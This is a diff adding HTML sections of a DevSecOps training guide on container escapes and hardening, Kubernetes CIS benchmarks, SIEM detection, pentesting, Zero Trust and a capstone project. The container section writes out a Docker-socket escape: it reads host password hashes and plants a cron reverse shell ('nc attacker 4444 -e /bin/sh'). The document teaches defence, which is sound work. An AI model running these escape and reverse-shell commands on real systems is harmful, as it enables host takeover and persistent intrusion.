+    <rect x="310" y="80" width="200" height="90" rx="8" fill="#21262d" stroke="#ff7b72" stroke-width="2"/><text x="410" y="106" text-anchor="middle" class="svg-label" fill="#ff7b72">Risky container</text><text x="410" y="128" text-anchor="middle" class="svg-sub">--privileged, docker.sock,</text><text x="410" y="146" text-anchor="middle" class="svg-sub">root, CAP_SYS_ADMIN</text><text x="410" y="164" text-anchor="middle" class="svg-sub">✗ escape → host root</text>
+    <rect x="550" y="80" width="200" height="90" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="650" y="106" text-anchor="middle" class="svg-label" fill="#58a6ff">Strong isolation</text><text x="650" y="128" text-anchor="middle" class="svg-sub">gVisor (userspace kernel)</text><text x="650" y="146" text-anchor="middle" class="svg-sub">or Kata (micro-VM)</text><text x="650" y="164" text-anchor="middle" class="svg-sub">✓ for untrusted code</text>
+    <line x1="410" y1="170" x2="410" y2="220" stroke="#ff7b72" stroke-width="2" stroke-dasharray="4 3" marker-end="url(#sec-esc)"/><text x="470" y="200" class="svg-sub" fill="#ff7b72">escape path</text>
+    <text x="410" y="278" text-anchor="middle" class="svg-sub">Strip the isolation and a container is just a process on your host with whatever privileges it held.</text>
+  </g>
+  <defs><marker id="sec-esc" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#ff7b72"/></marker></defs>
+</svg>
+<figcaption>A container is isolated only by namespaces and cgroups over a shared kernel. Misconfig (privileged, mounted socket, excess caps) punches through to host root; untrusted workloads need gVisor/Kata for a real boundary.</figcaption>
+</figure>
+<div class="box danger"><span class="box-title">How container escapes happen</span><ul><li><strong><code>--privileged</code></strong> — removes almost all isolation; a privileged container can trivially own the host. Never use in production.</li><li><strong>Mounting the Docker socket</strong> (<code>/var/run/docker.sock</code>) — equivalent to root on the host.</li><li><strong>Running as root</strong> inside the container — a kernel exploit then means host root.</li><li><strong>Excessive capabilities</strong> (<code>CAP_SYS_ADMIN</code>) or host mounts (<code>/</code>, <code>/proc</code>).</li></ul><p>See why in the <a href="linux-complete-guide.html#namespaces-cgroups">Linux namespaces/cgroups section</a> — a container is just a process with isolation; strip the isolation and it's just a process on your host.</p></div>
+<div class="box best"><span class="box-title">Container hardening</span><ul><li>Non-root user, read-only root filesystem, <code>no-new-privileges</code>.</li><li>Drop all capabilities, add back only what's needed.</li><li>Seccomp + AppArmor/SELinux profiles to restrict syscalls.</li><li>For untrusted workloads, use stronger isolation: <strong>gVisor</strong> (userspace kernel) or <strong>Kata Containers</strong> (lightweight VMs).</li><li>Runtime detection (Falco) to catch escapes in progress.</li></ul></div>
+
+<h4>Why container escapes are possible at all</h4>
+<p>Because a container is <em>not</em> a security boundary in the way a VM is — it's a process sharing the host kernel, isolated only by namespaces and cgroups. Anything that punches through that thin isolation (a kernel bug, or a config that hands the container real host access) puts the attacker on the host with whatever privileges the container had. Understanding the escape vectors is precisely what tells you which knobs to lock down.</p>
+
+<h4>How a Docker-socket escape works, step by step</h4>
+<p>The most common real-world escape doesn't even need a kernel exploit — just a mounted Docker socket. The socket is the Docker daemon's API, and the daemon runs as <em>root on the host</em>. So a container that can talk to it can ask the daemon to start a <em>new</em> container that mounts the host's root filesystem — instant host takeover:</p>
+
+<div class="code-label label-cmd">Escaping via a mounted /var/run/docker.sock</div>
+<pre><code># Inside a container that (mistakenly) has the socket mounted:
+docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
+#   # now you are root on the HOST filesystem:
+cat /host/etc/shadow            # host password hashes
+echo '* * * * * root nc attacker 4444 -e /bin/sh' &gt;&gt; /host/etc/crontab
+#   → persistent root on the node. Game over.
+
+# --privileged is just as bad — it hands over host devices + all capabilities:
+docker run --privileged alpine sh -c 'mount /dev/sda1 /mnt; ls /mnt'  # reads host disk</code></pre>
+<div class="code-label label-yaml">The controls that prevent it</div>
+<pre><code>securityContext:
+  runAsNonRoot: true
+  allowPrivilegeEscalation: false
+  capabilities: { drop: ["ALL"] }
+  seccompProfile: { type: RuntimeDefault }   # blocks obscure syscalls exploits use
+# And NEVER: privileged:true, hostPID/hostNetwork, or mounting the docker socket / host paths.
+# For untrusted code, add runtimeClassName: gvisor  (a userspace kernel between you and the host)</code></pre>
+
+<div class="box danger"><span class="box-title">The escape vectors to eliminate</span><ul><li><strong><code>--privileged</code></strong> — disables namespacing of devices + grants all capabilities; trivial host takeover.</li><li><strong>Mounting <code>/var/run/docker.sock</code></strong> — equals root on the host (shown above).</li><li><strong>Running as root in-container</strong> — turns a kernel bug into host root.</li><li><strong><code>CAP_SYS_ADMIN</code> / host mounts (<code>/</code>, <code>/proc</code>) / <code>hostPID</code>/<code>hostNetwork</code></strong> — each a documented escape path.</li><li><strong>Old kernels</strong> — unpatched CVEs (e.g. Dirty Pipe, runc CVE-2019-5736) enable escape from an otherwise "normal" container.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a costume vs a real wall</span><p>A container is a person in an "I'm my own separate room" costume — the costume (namespaces) usually convinces the kernel to treat them as isolated. But it's still one person standing in the shared building. Hand them the building's master key (docker socket) or let them take the costume off (<code>--privileged</code>), and they walk anywhere. For genuinely dangerous guests you don't trust a costume — you build an actual wall (gVisor/Kata VM).</p></div>
+
+<h2 id="k8s-cis">22. Kubernetes Security &amp; CIS Benchmarks</h2>
+<p class="section-intro">Kubernetes has a large attack surface. The CIS Kubernetes Benchmark is the industry checklist; tools automate scoring against it.</p>
+<table>
+  <tr><th>Layer</th><th>Control</th></tr>
+  <tr><td>Cluster</td><td>Restrict API server access, audit logging, encrypt etcd, upgrade regularly</td></tr>
+  <tr><td>AuthN/AuthZ</td><td>Least-privilege RBAC, no anonymous access, disable default SA token automount</td></tr>
+  <tr><td>Workload</td><td>Pod Security Standards (restricted), no privileged pods, resource limits</td></tr>
+  <tr><td>Network</td><td>Default-deny NetworkPolicies, mTLS via mesh</td></tr>
+  <tr><td>Supply chain</td><td>Signed images, admission control (Kyverno/OPA)</td></tr>
+  <tr><td>Runtime</td><td>Falco/Tetragon detection, drift prevention</td></tr>
+</table>
+<div class="code-label label-cmd">Scan a cluster against CIS</div>
+<pre><code>kube-bench run --targets master,node      # score against CIS Benchmark
+kube-hunter --remote &lt;api-server&gt;          # active pen-test of the cluster
+trivy k8s --report summary cluster        # vulnerabilities + misconfigs</code></pre>
+<div class="box note"><span class="box-title">Full depth in the Kubernetes guide</span><p>The <a href="kubernetes-complete-guide.html#rbac">Kubernetes guide</a> covers RBAC, Pod Security Standards, NetworkPolicies, and admission control hands-on. This section is the security-focused checklist tying them to CIS benchmarks and threat models.</p></div>
+
+<h4>Why the CIS Benchmark exists</h4>
+<p>"Secure Kubernetes" is too vague to act on and too easy to argue about. The CIS Kubernetes Benchmark exists to turn expert consensus into a concrete, numbered, testable checklist — every item is a specific setting with a rationale, a check, and a remediation. That makes hardening auditable ("we pass CIS 1.2.x") and automatable, and it gives teams a shared baseline instead of everyone guessing.</p>
+
+<h4>How kube-bench scores a node under the hood</h4>
+<p>kube-bench reads the actual config on the node — the API server / kubelet flags, file permissions on <code>/etc/kubernetes/*</code>, and manifest files — and compares each against the benchmark's expected value. For example, it checks that the API server is started with <code>--anonymous-auth=false</code> and <code>--authorization-mode</code> excludes <code>AlwaysAllow</code>, and that <code>admin.conf</code> is <code>0600</code>. Each check returns PASS/FAIL/WARN with the exact remediation command, so the output <em>is</em> your hardening to-do list.</p>
+
+<div class="code-label label-output">Reading a kube-bench result</div>
+<pre><code>[FAIL] 1.2.1  Ensure that the --anonymous-auth argument is set to false
+[FAIL] 1.2.16 Ensure that the admission control plugin PodSecurity is set
+[WARN] 4.2.6  Ensure that the --protect-kernel-defaults argument is set to true
+[PASS] 1.2.6  Ensure that the --kubelet-certificate-authority is set
+
+== Remediation ==
+1.2.1  Edit the API server manifest /etc/kubernetes/manifests/kube-apiserver.yaml
+       and set --anonymous-auth=false
+== Summary ==   42 checks PASS, 6 FAIL, 3 WARN</code></pre>
+
+<div class="box danger"><span class="box-title">Common cluster-hardening mistakes</span><ul><li><strong>Anonymous auth left enabled</strong> or authorization mode allowing everything.</li><li><strong>etcd unencrypted / unauthenticated</strong> — it holds every Secret in plaintext; direct etcd access = full cluster compromise.</li><li><strong>API server exposed to the internet</strong> without tight authn and network restriction.</li><li><strong>No audit logging</strong> — after an incident you can't reconstruct what the attacker did.</li><li><strong>Running kube-bench once</strong> and never re-checking after upgrades reintroduce drift.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a building-code inspection with a checklist</span><p>You wouldn't certify a building "safe" on vibes — an inspector walks a standardized checklist: fire exits present, wiring to code, extinguishers charged. The CIS Benchmark is that checklist for a cluster, and kube-bench is the inspector who walks it automatically and hands you the exact list of things to fix.</p></div>
+
+<h2 id="siem">23. SIEM, SOC &amp; Detection</h2>
+<p class="section-intro">Prevention fails eventually — you need to <em>detect</em> and <em>respond</em>. A SIEM aggregates logs and alerts on suspicious patterns; a SOC is the team that acts on them.</p>
+<figure class="diagram">
+<svg viewBox="0 0 820 200" role="img" aria-label="Logs flow into SIEM for detection">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">SIEM: centralize logs → detect → alert → respond</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="30" y="55" width="130" height="35" rx="5" fill="#21262d" stroke="#8b949e"/><text x="95" y="78" text-anchor="middle" class="svg-sub">app logs</text>
+    <rect x="30" y="100" width="130" height="35" rx="5" fill="#21262d" stroke="#8b949e"/><text x="95" y="123" text-anchor="middle" class="svg-sub">cloud audit</text>
+    <rect x="30" y="145" width="130" height="35" rx="5" fill="#21262d" stroke="#8b949e"/><text x="95" y="168" text-anchor="middle" class="svg-sub">network/EDR</text>
+    <rect x="320" y="90" width="180" height="55" rx="8" fill="#21262d" stroke="#d13438" stroke-width="2"/><text x="410" y="113" text-anchor="middle" class="svg-label" fill="#ff6b6f">SIEM</text><text x="410" y="131" text-anchor="middle" class="svg-sub">correlate &amp; detect</text>
+    <rect x="620" y="90" width="170" height="55" rx="8" fill="#21262d" stroke="#7ee787"/><text x="705" y="113" text-anchor="middle" class="svg-sub">SOC / SOAR</text><text x="705" y="131" text-anchor="middle" class="svg-sub">alert &amp; respond</text>
+    <g stroke="#58a6ff" stroke-width="1.5"><line x1="160" y1="72" x2="318" y2="105" marker-end="url(#si)"/><line x1="160" y1="117" x2="318" y2="117" marker-end="url(#si)"/><line x1="160" y1="162" x2="318" y2="130" marker-end="url(#si)"/><line x1="500" y1="117" x2="618" y2="117" marker-end="url(#si)"/></g>
+  </g>
+  <defs><marker id="si" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#58a6ff"/></marker></defs>
+</svg>
+<figcaption>All security-relevant logs flow to a SIEM (Splunk, Elastic, Sentinel, Wazuh) which correlates them and raises alerts; a SOC team (with SOAR automation) investigates and responds. This closes the detect-and-respond loop.</figcaption>
+</figure>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 260" role="img" aria-label="SIEM detection pipeline from ingest to normalize to correlate to ATTACK mapping to response">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">SIEM pipeline: ingest → normalize → correlate → ATT&amp;CK → respond</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="20" y="90" width="130" height="66" rx="8" fill="#21262d" stroke="#8b949e"/><text x="85" y="118" text-anchor="middle" class="svg-label">Ingest</text><text x="85" y="138" text-anchor="middle" class="svg-sub">apps, cloud, EDR</text>
+    <rect x="176" y="90" width="130" height="66" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="241" y="118" text-anchor="middle" class="svg-label">Normalize</text><text x="241" y="138" text-anchor="middle" class="svg-sub">common schema</text>
+    <rect x="332" y="90" width="140" height="66" rx="8" fill="#21262d" stroke="#f0883e"/><text x="402" y="112" text-anchor="middle" class="svg-label">Correlate</text><text x="402" y="132" text-anchor="middle" class="svg-sub">rules: signature</text><text x="402" y="148" text-anchor="middle" class="svg-sub">+ behavioral</text>
+    <rect x="498" y="90" width="140" height="66" rx="8" fill="#21262d" stroke="#d2a8ff"/><text x="568" y="112" text-anchor="middle" class="svg-label" fill="#d2a8ff">ATT&amp;CK map</text><text x="568" y="132" text-anchor="middle" class="svg-sub">T1110 brute force</text><text x="568" y="148" text-anchor="middle" class="svg-sub">T1078 valid accts</text>
+    <rect x="664" y="90" width="140" height="66" rx="8" fill="#21262d" stroke="#7ee787" stroke-width="2"/><text x="734" y="118" text-anchor="middle" class="svg-label" fill="#7ee787">Respond</text><text x="734" y="138" text-anchor="middle" class="svg-sub">SOC + SOAR</text>
+    <g stroke="#8b949e" stroke-width="1.5">
+      <line x1="150" y1="123" x2="174" y2="123" marker-end="url(#sec-siem2)"/>
+      <line x1="306" y1="123" x2="330" y2="123" marker-end="url(#sec-siem2)"/>
+      <line x1="472" y1="123" x2="496" y2="123" marker-end="url(#sec-siem2)"/>
+      <line x1="638" y1="123" x2="662" y2="123" marker-end="url(#sec-siem2)"/>
+    </g>
+    <text x="410" y="200" text-anchor="middle" class="svg-sub">Each event is innocent alone; the SIEM makes the <tspan fill="#ff7b72">chain</tspan> visible: failed logins → success → priv-change → data egress.</text>
+    <text x="410" y="228" text-anchor="middle" class="svg-sub">Mapping alerts to MITRE ATT&amp;CK tells the analyst which stage of an intrusion they're seeing.</text>
+  </g>
+  <defs><marker id="sec-siem2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>Raw logs are normalized to a common schema, evaluated against signature and behavioral rules, tagged with MITRE ATT&amp;CK techniques, then handed to the SOC/SOAR for investigation and automated response.</figcaption>
+</figure>
+
+<div class="box note"><span class="box-title">Detection concepts</span><p><strong>IOC</strong> (Indicator of Compromise) — evidence of a breach (a known-bad IP/hash). <strong>TTP</strong> (Tactics, Techniques, Procedures) — how attackers operate, catalogued in the <strong>MITRE ATT&amp;CK</strong> framework. Modern detection maps alerts to ATT&amp;CK techniques so you know <em>where</em> in an attack you are. Ties into the <a href="observability-k8s-guide.html">Observability</a> logging pipeline.</p></div>
+
+<h4>Why a SIEM exists</h4>
+<p>Individual logs are innocent in isolation — one failed login, one new outbound connection, one new IAM user. An attack is a <em>pattern across</em> those logs, often across different systems and hours apart. A SIEM exists to centralize everything and correlate it so the pattern becomes visible: failed logins <em>then</em> a success <em>then</em> a privilege change <em>then</em> data egress is obviously an attack chain, even though each event alone is noise. It also gives you the searchable history you need for forensics after the fact.</p>
+
+<h4>How detection works under the hood: correlation + ATT&amp;CK mapping</h4>
+<p>Logs are shipped, normalized to a common schema (so a Windows event and an AWS CloudTrail event have comparable fields), then evaluated against <strong>detection rules</strong>. Rules are either signature-based (match a known-bad IOC) or behavioral (thresholds/sequences: "&gt;10 failed logins from one IP followed by a success within 5 min"). Each rule is tagged with a MITRE ATT&amp;CK technique (e.g. T1110 Brute Force, T1078 Valid Accounts) so an analyst sees not just "an alert" but <em>which stage of an intrusion</em> it represents, and can pivot to related techniques.</p>
+
+<div class="code-label label-config">A correlation rule (Sigma) mapped to ATT&amp;CK</div>
+<pre><code>title: Successful login after many failures (possible brute force)
+logsource: { product: linux, service: auth }
+detection:
+  failures:  { message|contains: "Failed password" }
+  success:   { message|contains: "Accepted password" }
+  timeframe: 5m
+  condition: failures | count() by src_ip &gt; 10 and success
+level: high
+tags: [attack.credential_access, attack.t1110]   # MITRE ATT&amp;CK</code></pre>
+<div class="code-label label-output">The alert an analyst triages</div>
+<pre><code>[HIGH] Brute force success  src_ip=203.0.113.9  user=deploy  host=api-3
+  15 failed + 1 accepted password in 4m12s   ATT&amp;CK: T1110 → T1078
+  Playbook: disable user, kill sessions, check for lateral movement (T1021)</code></pre>
+
+<div class="box warn"><span class="box-title">Common SIEM/SOC mistakes</span><ul><li><strong>Collecting logs but writing no detections</strong> — an expensive log lake that never fires an alert.</li><li><strong>Alert fatigue</strong> — too many low-value alerts, so analysts miss the real one. Tune and prioritize by ATT&amp;CK severity.</li><li><strong>Not logging the right sources</strong> (auth, cloud audit/CloudTrail, DNS, EDR) — you can't detect what you don't collect.</li><li><strong>Mutable/short-retention logs</strong> — attackers delete their tracks, or the evidence has aged out before you investigate.</li><li><strong>No response runbook</strong> — detection without a defined response just tells you you're being robbed.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a mall's central security room</span><p>Each shop's camera sees only its own doorway. The mall's security room pipes every feed into one wall of monitors, so a guard can follow a shoplifter from store to store and spot the pattern no single shopkeeper could. The SIEM is that room; the SOC is the guards; MITRE ATT&amp;CK is the shared playbook of "here's how thieves usually operate" so guards know what to watch for next.</p></div>
+
+<h2 id="pentest">24. Penetration Testing &amp; Red Teaming</h2>
+<p class="section-intro">Proactively attack your own systems to find weaknesses before adversaries do — the offensive complement to defensive controls.</p>
+<table>
+  <tr><th>Activity</th><th>Scope</th></tr>
+  <tr><td>Vulnerability scanning</td><td>Automated, broad, known issues (Nessus, OpenVAS)</td></tr>
+  <tr><td>Penetration test</td><td>Scoped, manual exploitation of a target</td></tr>
+  <tr><td>Red team</td><td>Goal-driven, stealthy, simulates a real adversary end-to-end</td></tr>
+  <tr><td>Purple team</td><td>Red + blue collaborate to improve detection</td></tr>
+  <tr><td>Bug bounty</td><td>Crowdsourced external researchers, pay per valid finding</td></tr>
+</table>
+<div class="box warn"><span class="box-title">Rules of engagement matter</span><p>Only test systems you're authorized to test — unauthorized testing is illegal. Pen tests need a signed scope, rules of engagement, and a defined blast radius. The <em>value</em> is in the remediation: findings must become tracked, fixed action items (like <a href="sre-complete-guide.html#postmortems">postmortem</a> items), not a report that gathers dust.</p></div>
+
+<h4>Why offensive testing exists</h4>
+<p>Defenders have to be right everywhere; attackers only need one gap. Automated scanners and code review find <em>known</em> categories of flaw, but they can't chain three low-severity issues into a critical breach the way a creative human can. Pen testing and red teaming exist to validate that your defenses actually work against a thinking adversary — and, just as importantly, to test whether your <em>detection and response</em> notice the attack at all.</p>
+
+<h4>How a penetration test proceeds under the hood</h4>
+<p>A test follows a repeatable methodology (PTES/OWASP): <strong>recon</strong> (map the attack surface — subdomains, ports, tech), <strong>scanning/enumeration</strong> (find services and versions), <strong>exploitation</strong> (turn a vuln into access), <strong>post-exploitation</strong> (escalate privilege, move laterally, reach the objective — the "so what?"), and <strong>reporting</strong> (reproducible steps + risk + remediation). A red team adds stealth and tests the blue team's detection; a purple team runs it collaboratively so every attack technique becomes a new detection rule.</p>
+
+<div class="code-label label-cmd">Early phases against an authorized, scoped target</div>
+<pre><code># Recon/enumeration — what's exposed?
+nmap -sV -p- 10.0.5.20
+#   22/tcp  open  ssh      OpenSSH 8.2
+#   8080/tcp open  http     Apache Tomcat 9.0.30   ← known-vuln version
+
+# The value is the CHAIN + the "so what", not one finding:
+#   Tomcat 9.0.30 (CVE) → RCE as tomcat user
+#   → reused DB creds in config → read customer PII  ← business impact
+# Report each step reproducibly, rank by real impact, file remediation tickets.</code></pre>
+
+<div class="box danger"><span class="box-title">Common pentesting mistakes</span><ul><li><strong>Testing without written authorization/scope</strong> — that's a crime, not a test.</li><li><strong>Treating the report as the deliverable.</strong> The deliverable is <em>fixed</em> findings with tracked tickets and a retest.</li><li><strong>Only reporting individual vulns</strong> and not the <em>chains</em> that produce real impact.</li><li><strong>Never testing detection</strong> — if the SOC didn't notice the red team, that's a finding too.</li><li><strong>A once-a-year test</strong> as the only security effort, instead of continuous shift-left controls.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: hiring a locksmith to burgle you</span><p>You hire a professional to try to break into your own house — with a signed contract saying it's allowed. They don't just note "the back window is weak"; they show how the weak window let them reach the safe, and how the alarm didn't go off. Then you fix the window <em>and</em> the alarm. The report isn't the point; the locked window is.</p></div>
+
+<h2 id="zero-trust">25. Zero-Trust Architecture</h2>
+<p class="section-intro">The modern security model: "never trust, always verify." Drop the idea of a trusted internal network — authenticate and authorize every request, everywhere.</p>
+<figure class="diagram">
+<svg viewBox="0 0 820 220" role="img" aria-label="Perimeter model versus zero trust">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Perimeter ("castle &amp; moat") vs Zero Trust</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="40" y="55" width="330" height="150" rx="10" fill="none" stroke="#ff7b72" stroke-width="2"/><text x="205" y="78" text-anchor="middle" class="svg-label" fill="#ff7b72">Perimeter model</text>
+    <text x="205" y="106" text-anchor="middle" class="svg-sub">hard shell, soft inside</text>
+    <text x="205" y="128" text-anchor="middle" class="svg-sub">once in, trusted everywhere</text>
+    <text x="205" y="152" text-anchor="middle" class="svg-sub">one breach → free lateral movement</text>
+    <text x="205" y="182" text-anchor="middle" class="svg-sub">❌ fails against insider/compromise</text>
+
+    <rect x="450" y="55" width="330" height="150" rx="10" fill="none" stroke="#7ee787" stroke-width="2"/><text x="615" y="78" text-anchor="middle" class="svg-label" fill="#7ee787">Zero Trust</text>
+    <text x="615" y="106" text-anchor="middle" class="svg-sub">verify every request</text>
+    <text x="615" y="128" text-anchor="middle" class="svg-sub">identity + device + context</text>
+    <text x="615" y="152" text-anchor="middle" class="svg-sub">least privilege, micro-segmented</text>
+    <text x="615" y="182" text-anchor="middle" class="svg-sub">✓ breach stays contained</text>
+  </g>
+</svg>
+<figcaption>Zero Trust assumes the network is already compromised. Every request — even "internal" — must prove identity and authorization. mTLS, short-lived tokens, micro-segmentation, and continuous verification implement it.</figcaption>
+</figure>
+<div class="box best"><span class="box-title">Implementing Zero Trust</span><ul><li><strong>Strong identity</strong> for every user AND service (mTLS, OIDC, SPIFFE/SPIRE).</li><li><strong>Micro-segmentation</strong> — <a href="kubernetes-complete-guide.html#networkpolicy">NetworkPolicies</a> + <a href="kubernetes-complete-guide.html#service-mesh">service mesh</a> mTLS.</li><li><strong>Least privilege + continuous authorization</strong> — check every request, factor in device posture &amp; context.</li><li><strong>Assume breach</strong> — encrypt everywhere, log everything, minimize blast radius.</li></ul></div>
+
+<h4>Why the perimeter model failed</h4>
+<p>The "castle and moat" assumed the network boundary equals the trust boundary — inside = safe, outside = dangerous. Cloud, remote work, SaaS, microservices, and mobile dissolved the perimeter: there's no single "inside" anymore, and one phished laptop or compromised service lands the attacker <em>inside</em> the trusted zone with free lateral movement. Zero Trust exists because in modern architectures the network location tells you nothing about whether a request is legitimate.</p>
+
+<h4>How Zero Trust verifies each request under the hood</h4>
+<p>The core shift is from a one-time perimeter check to a <strong>per-request policy decision</strong>. Every request flows through a <em>policy enforcement point</em> (a service-mesh sidecar, an identity-aware proxy) that consults a <em>policy decision point</em>. The decision combines: <strong>who</strong> (verified identity — mTLS client cert / SPIFFE ID / OIDC token), <strong>what</strong> (the specific action/resource), and <strong>context</strong> (device posture, token freshness, anomaly signals). Only if all pass is the request allowed — and the identity is cryptographic (a workload's certificate), not an IP address that can be spoofed or reused.</p>
+
+<div class="code-label label-yaml">Per-request verification: identity + action, evaluated every call</div>
+<pre><code># Service mesh: require mTLS for ALL traffic (identity on every request)
+apiVersion: security.istio.io/v1
+kind: PeerAuthentication
+metadata: { name: default, namespace: prod }
+spec: { mtls: { mode: STRICT } }
+---
+# Then authorize per action — 'web' may only GET the catalog, nothing more:
+apiVersion: security.istio.io/v1
+kind: AuthorizationPolicy
+metadata: { name: catalog-read-only, namespace: prod }
+spec:
+  selector: { matchLabels: { app: catalog } }
+  action: ALLOW
+  rules:
+    - from: [{ source: { principals: ["cluster.local/ns/prod/sa/web"] } }]  # mTLS identity
+      to:   [{ operation: { methods: ["GET"], paths: ["/catalog/*"] } }]
+# A stolen network position with no valid cert → denied. 'web' trying POST → denied.</code></pre>
+
+<div class="box danger"><span class="box-title">Common Zero-Trust mistakes</span><ul><li><strong>"Zero Trust" = buy a VPN/product.</strong> It's an architecture (identity + per-request authz + least privilege + assume-breach), not a purchase.</li><li><strong>Verifying users but not services.</strong> Service-to-service calls need identity (mTLS/SPIFFE) too — that's where lateral movement happens.</li><li><strong>Authenticating once and trusting the session forever</strong> — that's just a smaller perimeter. Re-evaluate per request.</li><li><strong>Micro-segmentation without identity</strong> — IP allow-lists alone are spoofable and brittle.</li><li><strong>Forgetting to log</strong> — "assume breach" requires the telemetry to detect and investigate one.</li></ul></div>
+
+<div class="box eli5"><span class="box-title">Mental model: a secure facility with badge-and-reason at every door</span><p>Old security: show your badge at the lobby, then wander the whole building freely. Zero Trust: every door reads your badge <em>and</em> checks you have a reason to enter <em>this</em> room, every single time — and the badge is a tamper-proof cryptographic one, not "you look like you belong here." Lose your badge and it's revoked instantly; steal a hallway pass and it still won't open the vault.</p></div>
+
+<div class="box eli5"><span class="box-title">You now have a lead-level security foundation</span><p>From DevSecOps culture and the shift-left pipeline through cryptography, PKI/TLS, identity, network security, secure coding, the full testing spectrum, dynamic secrets, container/K8s hardening, SIEM/SOC detection, pentesting, and Zero Trust. Security is cross-cutting — you'll apply these across every other guide.</p></div>
+
+<h2 id="capstone">26. Capstone: Secure a 3-Tier App End-to-End</h2>
+<p class="section-intro">The best way to prove you've learned DevSecOps is to build it. Here's a complete capstone project — take a typical 3-tier app (frontend + API + database) and apply security at every stage from commit to runtime. This mirrors real DevSecOps portfolio projects and ties every guide together.</p>
+
+<figure class="diagram">
+<svg viewBox="0 0 820 250" role="img" aria-label="Security applied at every stage of a 3-tier app pipeline">
+  <text x="410" y="24" text-anchor="middle" class="svg-title">Security gates at every stage — the DevSecOps pipeline</text>
+  <g font-family="-apple-system, sans-serif">
+    <rect x="20" y="60" width="120" height="46" rx="8" fill="#21262d" stroke="#7ee787"/><text x="80" y="80" text-anchor="middle" class="svg-sub">1. Code</text><text x="80" y="97" text-anchor="middle" class="svg-sub">pre-commit, SAST</text>
+    <rect x="160" y="60" width="120" height="46" rx="8" fill="#21262d" stroke="#58a6ff"/><text x="220" y="80" text-anchor="middle" class="svg-sub">2. Build</text><text x="220" y="97" text-anchor="middle" class="svg-sub">SCA, image scan</text>
+    <rect x="300" y="60" width="120" height="46" rx="8" fill="#21262d" stroke="#f0883e"/><text x="360" y="80" text-anchor="middle" class="svg-sub">3. Test</text><text x="360" y="97" text-anchor="middle" class="svg-sub">DAST</text>
+    <rect x="440" y="60" width="120" height="46" rx="8" fill="#21262d" stroke="#d2a8ff"/><text x="500" y="80" text-anchor="middle" class="svg-sub">4. Release</text><text x="500" y="97" text-anchor="middle" class="svg-sub">sign, provenance</text>
+    <rect x="580" y="60" width="120" height="46" rx="8" fill="#21262d" stroke="#4285f4"/><text x="640" y="80" text-anchor="middle" class="svg-sub">5. Deploy</text><text x="640" y="97" text-anchor="middle" class="svg-sub">admission verify</text>
+    <rect x="720" y="60" width="90" height="46" rx="8" fill="#21262d" stroke="#d13438"/><text x="765" y="80" text-anchor="middle" class="svg-sub">6. Run</text><text x="765" y="97" text-anchor="middle" class="svg-sub">Falco</text>
+    <g stroke="#8b949e" stroke-width="1.6"><line x1="140" y1="83" x2="158" y2="83" marker-end="url(#cap)"/><line x1="280" y1="83" x2="298" y2="83" marker-end="url(#cap)"/><line x1="420" y1="83" x2="438" y2="83" marker-end="url(#cap)"/><line x1="560" y1="83" x2="578" y2="83" marker-end="url(#cap)"/><line x1="700" y1="83" x2="718" y2="83" marker-end="url(#cap)"/></g>
+    <text x="410" y="150" text-anchor="middle" class="svg-sub">Frontend (React) → API (Node/Python) → Database (Postgres) — each secured, each stage gated.</text>
+    <text x="410" y="178" text-anchor="middle" class="svg-sub">Secrets in Vault · least-privilege IAM/RBAC · NetworkPolicies · TLS everywhere · everything as code.</text>
+  </g>
+  <defs><marker id="cap" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker></defs>
+</svg>
+<figcaption>Take a normal 3-tier app and add a security control at every stage. Completing this proves end-to-end DevSecOps competence — it's an ideal portfolio project.</figcaption>
+</figure>
+
+<div class="box best"><span class="box-title">The capstone checklist — build this</span><ol>
+  <li><strong>Code:</strong> pre-commit hooks with <code>gitleaks</code> (no secrets) + a linter; SAST (Semgrep) in CI. (<a href="#appsec">§20</a>, <a href="git-complete-guide.html#hooks">Git hooks</a>)</li>
+  <li><strong>Build:</strong> multi-stage non-root <a href="docker-complete-guide.html#distroless">distroless</a> images; SCA + image scan with Trivy; generate an SBOM. (<a href="#supply-chain">§7</a>)</li>
+  <li><strong>Test:</strong> run DAST (OWASP ZAP) against the deployed staging app. (<a href="#testing-deep">§21</a>)</li>
+  <li><strong>Release:</strong> sign the image with cosign + attach provenance. (<a href="#supply-chain">§7</a>)</li>
+  <li><strong>Deploy:</strong> GitOps (<a href="kubernetes-complete-guide.html#gitops-hands">Argo CD</a>) with an admission controller (Kyverno) that <em>refuses unsigned images</em>; secrets from <a href="#vault-deep">Vault</a>; least-privilege <a href="kubernetes-complete-guide.html#rbac">RBAC</a>; default-deny <a href="kubernetes-complete-guide.html#networkpolicy">NetworkPolicies</a>; Pod Security Standards. (<a href="#k8s-cis">§24</a>)</li>
+  <li><strong>Run:</strong> Falco for runtime detection; TLS/mTLS everywhere; centralized logs to a SIEM. (<a href="#runtime">§11</a>, <a href="#siem">§25</a>)</li>
+  <li><strong>Prove it:</strong> intentionally introduce a vulnerable dependency and a hardcoded secret, and watch the pipeline <em>block</em> them.</li>
+</ol></div>
+<div class="box eli5"><span class="box-title">Why this project makes you employable</span><p>Anyone can list "DevSecOps" on a résumé. Building this — a real app where a planted secret or CVE actually gets caught and blocked, running on a hardened cluster with signed images and runtime detection — <em>demonstrates</em> it. It touches Docker, Kubernetes, CI/CD, Terraform, observability, and security together, which is exactly what interviewers probe for.</p></div>
+
+<h4>Why the "prove it" step is the whole point</h4>
